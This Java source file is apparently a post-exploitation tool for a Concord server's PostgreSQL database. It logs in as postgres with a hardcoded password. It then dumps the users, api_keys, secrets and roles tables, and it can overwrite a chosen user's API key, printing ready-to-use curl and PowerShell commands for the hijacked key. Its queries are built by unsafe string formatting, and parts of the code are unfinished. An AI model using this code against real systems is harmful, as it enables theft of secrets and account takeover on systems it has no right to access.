import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
// apikey stuff
import java.security.SecureRandom;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Base64.Encoder;
import static java.util.Arrays.asList;
import java.util.List;
public class Client {
   public static String generateSecureRandom() {
        // create instance of SecureRandom class
        SecureRandom rnd = new SecureRandom();
        byte[] ab = new byte[16];
        rnd.nextBytes(ab);

        Encoder e = Base64.getEncoder().withoutPadding();
        String s =  e.encodeToString(ab);

        return s;
   }
   public static String generateAPIKeyHash(String secureRandom) {
        MessageDigest md;
        try {
            md = MessageDigest.getInstance("SHA-256");
        } catch (NoSuchAlgorithmException ex) {
            throw new RuntimeException(ex);
        }

        byte[] hash = Base64.getDecoder().decode(secureRandom);
        hash = md.digest(hash);
        String api_key = Base64.getEncoder().withoutPadding().encodeToString(hash);
        System.out.println(String.format("ApiKey: %s", api_key));
        return api_key;
   }
   public static void update(Connection c, String table, List<String> columns, List<String> columnsConditions, List<String> columnsConditionsValues, String ... values) {
      String colUnpacked = "";
      System.out.print("(+) ");
      for (int i = 0; i < columns.size(); ++i) {
          String sql = String.format("UPDATE %s SET %s = '%s' where %s = '%s'", table,columns.get(i), values[i], columnsConditions.get(i), columnsConditionsValues.get(i));
           System.out.print(sql);
         if (i < columns.size() - 1) {
            //colUnpacked += columns.at(i);
            colUnpacked += ",";
            //System.out.print(columns.at(i));
            //System.out.print(" ");

            //String sql = String.format("UPDATE %s SET api_key = '%s' where user_id = 'd4f123c1-f8d4-40b2-8a12-b8947b9ce2d8'", table, generateAPIKeyHash(apiKey));
         }
         else {
            //colUnpacked += columns.at(i);
            //System.out.print(columns.at(i));
         }
      }
      try {

      } catch(Exception e) {
         System.err.println("(-) Failure in Update");
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);        
      }
   }
   public static void update(Connection c) {
      try {
         Statement stmt = null;
         String apiKey = generateSecureRandom();
         String sql = String.format("UPDATE api_keys SET api_key = '%s' where user_id = 'd4f123c1-f8d4-40b2-8a12-b8947b9ce2d8'", generateAPIKeyHash(apiKey));
         stmt = c.createStatement();
         stmt.executeUpdate(sql);
         //ResultSet rs = stmt.executeQuery(sql);
         System.out.print("(+) Updating api key for concord user");
         System.out.println(String.format("APIKey: %s", apiKey));
         System.out.println(String.format("Powershell: iwr -Uri 'http://concord:8001/api/v1/apikey' -Headers @{ Authorization = \"%s\";ContentType= \"application/json\"}", apiKey));
         System.out.println(String.format("Bash: curl -H \"authorization: %s\" -H \"Content-Type: application/json\"  http://concord:8001/api/v1/apikey", apiKey));
         //rs.close();
         stmt.close();
      } catch(Exception e) {
         System.err.println("(-) Failure in Update");
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
      }
   }
   public static void getPermissions(Connection c, String table) {
      System.out.println(String.format("(+) Attempting to retrieve permissions for table: %s", table));
      try {
         Statement stmt = null;
         String sql = String.format("SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='%s'", table);
         stmt = c.createStatement();
         ResultSet rs = stmt.executeQuery(sql);
         System.out.print("(+) Grantee Privilege Type");
         while ( rs.next() ) {
            System.out.println(String.format("(+) %s %s",rs.getString("grantee"),rs.getString("privilege_type")));
         }
         rs.close();
         stmt.close();
      } catch(Exception e) {
         System.err.println("(-) Failure in getPermissions");
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
      }

   }
   public static void getTables(Connection c) {
      System.out.println("(+) Attempting to retrieve tables");
      try {
         Statement stmt = null;
         String sql = "SELECT * FROM information_schema.tables";
         stmt = c.createStatement();
         ResultSet rs = stmt.executeQuery(sql);
         System.out.print("(+) ");
         while ( rs.next() ) {
            System.out.println(String.format("(+) Table Name: %s",rs.getString("table_name")));
         }
         rs.close();
         stmt.close();
      } catch (Exception e) {
         System.err.println("(-) Failure in getTables");
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
      }
   }
   public static void getColumns(Connection c, String table) {
      System.out.println(String.format("(+) Attempting to retrieve column names from table: %s", table));
      try {
         Statement stmt = null;
         String sql = String.format("SELECT column_name, data_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = '%s'", table);
         stmt = c.createStatement();
         ResultSet rs = stmt.executeQuery(sql);
         while ( rs.next() ) {
            System.out.println(String.format("(+) Column Name: %s | Datatype: %s",rs.getString("column_name"), rs.getString("data_type")));
         }
         rs.close();
         stmt.close();
      } catch(Exception e) {
         System.err.println("(-) Failure in getColumns");
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
      }
   }

   public static String ezFormat(Object... args) {
      String format = new String(new char[args.length]).replace("\0", "%s;");
      return String.format(format, args);
   }
   public static void dumpTable(Connection c, String table, String ... columns) {
      //System.out.println(ezFormat(columns));
      System.out.println(String.format("(+) Attempting to dump table: %s", table));
      String colUnpacked = "";
      System.out.print("(+) ");
      for (int i = 0; i < columns.length; ++i) {
         if (i < columns.length - 1) {
            colUnpacked += columns[i];
            colUnpacked += ",";
            System.out.print(columns[i]);
            System.out.print(" ");
         }
         else {
            colUnpacked += columns[i];
            System.out.print(columns[i]);
         }
      }
      System.out.println("");
      try {
         Statement stmt = null;
         String sql = String.format("SELECT %s FROM %s", colUnpacked, table);
         stmt = c.createStatement();
         ResultSet rs = stmt.executeQuery(sql);
         while ( rs.next() ) {
            System.out.print("(+) ");
            for (int i = 0; i < columns.length; ++i) {
               System.out.print(String.format("%s ", rs.getString(columns[i])));
            }
            System.out.println("");
         }
         rs.close();
         stmt.close();
      } catch(Exception e) {
         System.err.println("(-) Failure in getColumns");
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
      }
      
   }
   public static void updateAPIKey(String db, String port) {
      try {
         Connection c = null;
         Statement stmt = null;
         Class.forName("org.postgresql.Driver");
         String url = String.format("jdbc:postgresql://%s:%s/postgres", db, port);
         c = DriverManager.getConnection(url, "postgres", "quake1quake2quake3arena");
         update(c);
      } catch(Exception e) {
         System.err.println("(-) Failure in Test");
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
      }
   }
   public static void dbExtract(String db, String port ) {
      try {
         Connection c = null;
         Statement stmt = null;
         Class.forName("org.postgresql.Driver");
         String url = String.format("jdbc:postgresql://%s:%s/postgres", db, port);
         c = DriverManager.getConnection(url, "postgres", "quake1quake2quake3arena");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         getTables(c);
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         getColumns(c, "users");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         getColumns(c, "api_keys");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         getColumns(c, "secrets");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         dumpTable(c, "users", "user_id", "username", "display_name", "user_type", "user_email", "is_disabled", "last_group_sync_dt", "domain");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         dumpTable(c, "api_keys", "user_id", "api_key", "key_id", "key_name", "expired_at", "last_notified_at");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         getPermissions(c, "secrets");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");

         dumpTable(c, "secrets", "secret_name", "secret_type", "secret_data", "encrypted_by", "secret_id", "org_id", "owner_id", "visibility", "store_type", "project_id");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         getColumns(c, "roles");
         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
         dumpTable(c, "roles", "role_id", "role_name", "global_reader", "global_writer");

         //update(c, "api_keys", asList("col1", "col2", "col3"), "val1", "val2", "val3");
         c.close();
      }catch(Exception e) {
         System.err.println("(-) Failure in getColumns");
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
      }
   }
   public static void main(String args[]) {
      Connection c = null;
      String db = "";
      String port = "";
      try {
         if(args.length != 2) {
            System.exit(0);
         }
         else {
            db = args[0];
            port = args[1];
         }
         dbExtract(db, port);
         //generateSecureRandom();
         //updateAPIKey(db, port);
            //String sql = String.format("UPDATE %s SET api_key = '%s' where user_id = 'd4f123c1-f8d4-40b2-8a12-b8947b9ce2d8'", table, generateAPIKeyHash(apiKey));
         //update(c, "api_keys", asList("api_key"), asList("user_id"), asList("d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8"), "api key value");
         //update(c, "api_keys", asList("col1", "col2", "col3"), "val1", "val2", "val3");
         
      } catch (Exception e) {
         e.printStackTrace();
         System.err.println(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
      }
   }
}